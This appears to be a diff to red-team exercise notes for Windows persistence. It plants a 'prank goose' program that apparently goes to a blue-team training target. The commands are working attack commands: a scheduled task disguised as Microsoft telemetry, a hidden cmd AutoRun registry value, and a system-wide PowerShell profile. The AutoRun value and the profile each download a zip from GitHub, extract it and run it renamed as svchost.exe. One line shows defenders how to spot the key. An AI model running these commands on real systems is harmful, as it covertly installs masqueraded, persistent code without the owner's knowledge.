@@ -21,11 +21,14 @@ Register-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsof
 
 schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync" /ri 10 /ru "INTERACTIVE"
 
-AutoRun Registry Key to launch goose during powershell & cmd:
+AutoRun Registry Key to launch goose with cmd and powershell:
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value 'if exist "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe" (start "" "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe") else (start /b powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \"https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip\" -OutFile \"$env:TEMP\g.zip\"; Expand-Archive -Path \"$env:TEMP\g.zip\" -DestinationPath \"$env:LOCALAPPDATA\Blueteeth\" -Force; Rename-Item -Path \"$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe\" -NewName \"svchost.exe\"")'
 
 Blueteamer can find reg key by checking:
 (Get-ItemProperty "HKLM:\Software\Microsoft\Command Processor").AutoRun
+
+(Additional persistence) Create powershell profile (Have to change user from Administrator to whatever):
+$p='C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'; New-Item $p -Force; '$g="$env:LOCALAPPDATA\Blueteeth\GooseTest-main\svchost.exe"; if(test-path $g){start $g}else{start-job {iwr "https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip" -outf "$env:temp\g.zip";expand "$env:temp\g.zip" -dest "$env:LOCALAPPDATA\Blueteeth" -f;ren "$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe" "svchost.exe"}}' | out-file $p -enc ascii -force
 
 Unregister Scheduled Task
 Unregister-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Confirm:$false
